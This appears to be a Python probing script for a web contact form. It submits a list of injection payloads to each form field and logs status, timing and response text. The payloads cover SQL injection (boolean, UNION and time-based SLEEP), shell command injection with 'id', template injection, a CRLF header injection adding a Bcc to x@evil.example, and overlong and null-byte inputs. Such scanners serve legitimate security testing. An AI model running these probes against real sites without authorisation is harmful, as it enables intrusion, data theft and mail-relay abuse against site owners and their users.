import time, uuid
from send_lib import send, base

T = "scanner@nothing.local"
probes = [
    ("baseline", {}),
    ("fname sqli", dict(fname="a' OR '1'='1")),
    ("fname sqli2", dict(fname="a' AND SLEEP(3)-- -")),
    ("fname union", dict(fname="' UNION SELECT 1,2,3-- -")),
    ("fname cmdi", dict(fname="a;id")),
    ("fname cmdi2", dict(fname="a$(id)")),
    ("fname ssti", dict(fname="{{7*7}}")),
    ("fname ssti2", dict(fname="${7*7}")),
    ("fname crlf", dict(fname="a\r\nBcc: x@evil.example")),
    ("fname long", dict(fname="A"*3000)),
    ("fname null", dict(fname="a\x00b")),
    ("lname sqli", dict(lname="' OR 1=1-- -")),
    ("cname sqli", dict(cname="' OR 1=1-- -")),
    ("cname ssti", dict(cname="{{constructor.constructor('return 1')()}}")),
    ("tel sqli", dict(tel="' OR 1=1-- -")),
    ("tel cmdi", dict(tel="1;id")),
    ("areacode sqli", dict(areacode="' OR 1=1-- -")),
    ("subject sqli", dict(subject="' OR 1=1-- -")),
    ("msg sqli", dict(msg="' OR 1=1-- -")),
    ("msg ssti", dict(msg="{{7*7}}")),
    ("msg sqli time", dict(msg="' AND SLEEP(4)-- -")),
    ("check sqli", dict(check="' OR 1=1-- -")),
    ("extra field", dict(zzz="' OR 1=1-- -")),
]
for name, over in probes:
    t0 = time.time()
    c, h, b = send(base(targets=T, **over), tries=15)
    dt = time.time() - t0
    print("%-16s %s %4.1fs len=%-4d %s" % (name, c, dt, len(b), b[:150]))
    time.sleep(0.8)
